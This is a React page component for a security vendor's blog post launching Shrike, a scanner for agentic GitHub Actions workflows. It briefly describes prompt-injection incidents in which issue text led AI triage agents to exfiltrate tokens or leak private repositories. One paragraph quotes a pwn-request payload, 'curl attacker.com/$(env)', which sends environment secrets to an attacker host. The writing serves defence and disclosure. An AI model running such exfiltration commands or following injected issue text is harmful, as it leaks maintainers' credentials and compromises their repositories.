import { createFileRoute, Link } from "@tanstack/react-router";

export const Route = createFileRoute("/blogs/shrike-launch")({
  head: () => ({
    meta: [
      { title: "Chelate Sec: Securing the Agentic CI/CD — Blogs" },
      {
        name: "description",
        content:
          "Today Chelate Sec launches Shrike — our open-source scanner for agentic CI/CD. Find the workflows an outsider can turn against you, before attackers do.",
      },
      { property: "og:title", content: "Chelate Sec: Securing the Agentic CI/CD" },
      {
        property: "og:description",
        content: "Launching Shrike — the open-source scanner for agentic CI/CD security.",
      },
      { property: "og:type", content: "article" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Post,
});

function H({ children }: { children: React.ReactNode }) {
  return (
    <h2 className="mt-16 font-display text-3xl font-black tracking-tight md:text-4xl">{children}</h2>
  );
}

function P({ children }: { children: React.ReactNode }) {
  return <p className="mt-6 text-lg leading-relaxed text-muted-foreground">{children}</p>;
}

function Code({ children }: { children: React.ReactNode }) {
  return (
    <pre className="mt-6 overflow-x-auto rounded-sm bg-sonic p-5 font-mono text-sm leading-relaxed text-sea">
      {children}
    </pre>
  );
}

function Post() {
  return (
    <div className="min-h-screen bg-background font-sans text-foreground">
      <header className="border-b border-ink bg-paper">
        <nav className="mx-auto flex max-w-7xl items-center justify-between px-6 py-6 text-ink">
          <Link to="/" className="flex items-center gap-2 text-lg font-extrabold tracking-tight">
            <span className="inline-block h-3 w-3 rounded-full bg-tomato" />
            chelate
          </Link>
          <Link to="/blogs" className="font-mono text-xs uppercase tracking-widest text-sea hover:text-ink">
            ← All blogs
          </Link>
        </nav>
      </header>

      <article className="mx-auto max-w-3xl px-6 pb-28 pt-16">
        <p className="font-mono text-xs uppercase tracking-[0.3em] text-tomato">Product Launch</p>
        <h1 className="mt-6 font-display text-5xl font-black leading-[0.95] tracking-tighter md:text-6xl">
          Chelate Sec: Securing the Agentic CI/CD
        </h1>
        <p className="mt-6 font-mono text-xs uppercase tracking-widest text-muted-foreground">
          Oct 21, 2026 · 5 min read · Chelate
        </p>

        <blockquote className="mt-12 rounded-sm border border-sea/40 bg-sonic/10 p-8 text-lg leading-relaxed text-foreground">
          In chemistry, a chelate grips a reactive metal at several points at once and locks it in a
          ring, so it can't react with anything around it — neutralized, not removed. A dangerous
          workflow is the same: you can't rip it out, but grip every point that makes it reactive —
          trigger, inputs, token, reach — and it can't be turned against you.
        </blockquote>

        <P>
          Today Chelate Sec, as part of securing the agentic workflows, is launching{" "}
          <strong className="text-foreground">Shrike</strong> — our open-source scanner for agentic
          CI/CD. You can find it on GitHub at{" "}
          <a href="https://github.com/ChelateSec/shrike" className="text-sea underline underline-offset-4 hover:text-tomato">
            ChelateSec/shrike
          </a>
          .
        </P>
        <P>
          Shrike reads your GitHub workflows, finds the ones an outsider can turn against you —
          including the AI agents now running in your pipelines — and tells you, for each, who can
          trigger it and what it can reach. One command, straight in your terminal, no noise.
        </P>

        <H>The Problem We Built It For</H>
        <P>
          CI/CD pipelines run untrusted input right next to production credentials. A stranger opens
          an issue, a pull request, or a comment — and a workflow runs holding your repo's write
          token, your publishing keys, your cloud secrets.
        </P>
        <P>
          AI made it worse. Teams now drop agents — Claude Code, Gemini CLI, Copilot — straight into
          their pipelines to triage issues, review PRs, and fix bugs. These agents read whatever a
          stranger writes, and act with those same credentials. It's the lethal trifecta: access to
          private data, exposure to untrusted content, and a way to communicate out. A CI pipeline
          running an agent has all three by default, and almost nobody can see it happening — which
          workflow touched which secret, what an agent read, what it did.
        </P>

        <H>A Year of the Same Bug</H>
        <P>This isn't theoretical. 2026 was one long demonstration:</P>
        <ul className="mt-6 space-y-4 text-lg leading-relaxed text-muted-foreground">
          {[
            ["GhostAction", "secret-stealing workflows pushed into 30,000+ repositories across ~1,900 hijacked accounts, sweeping entire git histories for cloud keys."],
            ["Clinejection", "a prompt hidden in a GitHub issue title reached Cline's AI triage agent and chained, through cache poisoning, to the credentials that publish Cline to millions of developers."],
            ["TrustIssues / gemini-cli (CVSS 10)", "a crafted issue made Google's triage agent read the Git token off disk, exfiltrate it, and pivot to a write token on a repo with 100,000+ stars."],
            ["Google ADK", "the first real-world agent-to-agent attack: a public triage agent talked into triggering a maintainer-only one."],
            ["GitLost", "one public issue, no account, and GitHub's own agent fetched a private repo and posted it as a public comment."],
            ["Workflow Identity Hijacking", "no prompt trick needed: a polite request through an unauthenticated door runs with the creator's privileges, because the identity that triggers a workflow is decoupled from the one that executes it."],
          ].map(([t, d]) => (
            <li key={t} className="flex gap-3">
              <span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-tomato" />
              <span>
                <strong className="text-foreground">{t}</strong> — {d}
              </span>
            </li>
          ))}
        </ul>
        <P>
          Six incidents, one root cause: nobody could see, or hold, what their pipeline was allowed
          to do.
        </P>

        <H>The Blast Radius</H>
        <P>
          A pipeline compromise doesn't stop at the pipeline — whatever it ships, it ships to
          everyone downstream.
        </P>
        <ul className="mt-6 space-y-4 text-lg leading-relaxed text-muted-foreground">
          <li className="flex gap-3">
            <span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-tomato" />
            <span><strong className="text-foreground">tj-actions/changed-files</strong> — one poisoned Action leaked CI secrets from 23,000+ repositories.</span>
          </li>
          <li className="flex gap-3">
            <span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-tomato" />
            <span><strong className="text-foreground">LiteLLM</strong> — a single package compromised for ~40 minutes dumped 118,829 CI secret sets across 2,488 organizations.</span>
          </li>
          <li className="flex gap-3">
            <span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-tomato" />
            <span>Supply-chain compromise is the biggest cost amplifier in IBM's 2026 breach report — <strong className="text-foreground">+$227,250 per incident, 258 days to contain</strong>.</span>
          </li>
        </ul>
        <P>One hijacked pipeline is millions of victims.</P>

        <H>What Shrike Does</H>
        <ul className="mt-6 space-y-4 text-lg leading-relaxed text-muted-foreground">
          {[
            ["Agent detection", "finds every workflow running an AI agent (Claude Code, Gemini CLI, Codex, AI Inference), the step nobody re-reviews."],
            ["Triggerability analysis", "can an outsider set it off? The trigger, and whether there's a real gate or an allowed_non_write_users: \"*\" that lets anyone in."],
            ["Reachability analysis", "what can it reach? Untrusted text into the prompt, the tools and token it holds, the secrets in range."],
            ["Classic coverage too", "pwn-requests, expression injection, TOCTOU-after-approval, over-privileged tokens."],
            ["Org-scale", "scan one repo or an entire GitHub org in one command."],
            ["No noise", "only real findings, ranked Severity · Triggerability · Impact, printed to your terminal."],
            ["CI-ready", "JSON and SARIF output, GitHub Security tab integration, non-zero exit to gate a build."],
          ].map(([t, d]) => (
            <li key={t} className="flex gap-3">
              <span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-sonic" />
              <span>
                <strong className="text-foreground">{t}</strong> — {d}
              </span>
            </li>
          ))}
        </ul>

        <H>How It Works</H>
        <Code>{`  GitHub Workflows
        ↓
   Parse triggers, jobs, steps, tokens
        ↓
   Find the AI-agent (and classic) steps
        ↓
   Q1: can an outsider trigger it?
   Q2: what can it reach?
        ↓
   Severity · Triggerability · Impact
        ↓
   Fix before an attacker finds it`}</Code>
        <P>Scan a local checkout:</P>
        <Code>{`shrike scan .`}</Code>
        <P>Or an entire org without cloning anything:</P>
        <Code>{`shrike scan --github-org your-org`}</Code>
        <P>
          Shrike reports only what passes the full test — outsider-triggerable and reaching
          something that matters — so every line is worth acting on.
        </P>

        <H>We Find These Ourselves</H>
        <P>
          We're not writing this from the outside. Finding these bugs by hand is how Chelate started
          — one of ours is a critical pwn-request in threlte, a popular Svelte 3D library
          (GHSA-p368-h5pf-7fc2). Its docs-preview workflow ran on pull_request_target with a write
          token and built the pull request's own code, so any contributor's fork — with a
          build:docs script running curl attacker.com/$(env) — got code execution and the repo's
          token. Trigger, prerequisite, reach: that trace is exactly what Shrike now runs for you,
          across a whole org, in seconds.
        </P>
        <P>
          And AI widens the same bug. The classic pwn-request needs the attacker to plant a payload
          in a fork. An agent needs only words — a prompt-injected issue reaches a thing that
          already holds the token and already runs shell. Same root cause, far lower bar, far harder
          to catch in review. Shrike checks for both, and leads on the one that's new.
        </P>

        <H>Built to Be Honest About Its Limits</H>
        <P>We'd rather Shrike under-claim than over-claim. A few things worth knowing:</P>
        <ul className="mt-6 space-y-4 text-lg leading-relaxed text-muted-foreground">
          <li className="flex gap-3"><span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-sea" /><span>Coverage today is GitHub Actions; GitLab CI, Jenkins, and others come next.</span></li>
          <li className="flex gap-3"><span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-sea" /><span>Shrike is static analysis — it finds reachable paths, not proof of exploitation. It tells you what an outsider could do, which is the point at review time.</span></li>
          <li className="flex gap-3"><span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-sea" /><span>The agent-action catalog is a living list; a brand-new agent action may need a rule before Shrike recognizes it.</span></li>
          <li className="flex gap-3"><span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-sea" /><span>Shrike is static analysis — it finds the risk, it doesn't yet stop it at runtime. That's Titra's job (below).</span></li>
        </ul>

        <H>What's Next: Titra</H>
        <P>Shrike finds the reactive points. Titra holds them.</P>
        <P>
          Titra is our runtime product: it watches what your pipeline agents actually do and blocks
          the dangerous actions before they land — a push to a protected branch, a self-approved PR,
          a leaked secret. Install a GitHub App, add one line to a workflow, and see every agent
          action in one place, with policy you control.
        </P>
        <ul className="mt-6 space-y-4 text-lg leading-relaxed text-muted-foreground">
          <li className="flex gap-3"><span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-sonic" /><span><strong className="text-foreground">See</strong> — a live record of every action each CI agent takes, across your org.</span></li>
          <li className="flex gap-3"><span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-sonic" /><span><strong className="text-foreground">Stop</strong> — deterministic policy blocks the dangerous actions in real time. Never an LLM deciding — a block that can't be prompt-injected.</span></li>
          <li className="flex gap-3"><span className="mt-2.5 h-2 w-2 shrink-0 rounded-full bg-sonic" /><span><strong className="text-foreground">Adopt safely</strong> — start in watch-only mode, turn on enforcement when you trust it. No broken pipelines on day one.</span></li>
        </ul>
        <P>
          Shrike is where every team starts, free and open. Titra is how enterprises hold it at
          scale — org-wide visibility, policy enforcement, and the audit trail security teams need.
          Coming soon; reach out to be an early design partner.
        </P>

        <H>Get Started</H>
        <P>Get started with Shrike in seconds. One command installs everything you need:</P>
        <Code>{`curl -fsSL https://chelate.tech/install.sh | bash`}</Code>
        <P>Then scan a repo or a whole org:</P>
        <Code>{`shrike scan .
shrike scan --github-org your-org`}</Code>
        <P>For CI, gate on severity:</P>
        <Code>{`shrike scan . --fail-on high --sarif results.sarif`}</Code>

        <div className="mt-16 rounded-sm border border-ink bg-sea/20 p-8">
          <h2 className="font-display text-2xl font-black tracking-tight">Explore Shrike</h2>
          <p className="mt-4 leading-relaxed text-muted-foreground">
            Shrike is open source and on GitHub. Full CLI reference, output schema, and rule list
            are in the repository README.
          </p>
          <a
            href="https://github.com/ChelateSec/shrike"
            className="mt-6 inline-block rounded-sm bg-tomato px-6 py-3 font-mono text-sm uppercase tracking-widest text-primary-foreground hover:opacity-90"
          >
            View Shrike on GitHub →
          </a>
        </div>

        <p className="mt-16 border-t border-border pt-8 font-mono text-xs uppercase tracking-[0.3em] text-sea">
          Securing the agentic workflows.
        </p>
      </article>

      <footer className="bg-paper py-10 text-sea">
        <div className="mx-auto max-w-7xl px-6">
          <div className="flex flex-wrap gap-x-8 gap-y-2 border-b border-ink/15 pb-6 font-mono text-xs uppercase tracking-widest">
            <a href="https://github.com/ChelateSec/shrike" className="text-ink hover:text-tomato">
              Shrike ↗
            </a>
            <a href="https://github.com/ChelateSec" className="text-ink hover:text-tomato">
              GitHub org ↗
            </a>
            <a href="https://www.chelate.tech/" className="hover:text-tomato">
              Chelate.tech ↗
            </a>
          </div>
        </div>
        <div className="mx-auto flex max-w-7xl flex-wrap items-center justify-between gap-4 px-6 pt-6 font-mono text-xs uppercase tracking-widest">
          <Link to="/" className="flex items-center gap-2 text-ink">
            <span className="inline-block h-2.5 w-2.5 rounded-full bg-tomato" /> chelate
          </Link>
          <span>© 2026 Chelate · Securing the Agentic Workflows</span>
        </div>
      </footer>
    </div>
  );
}
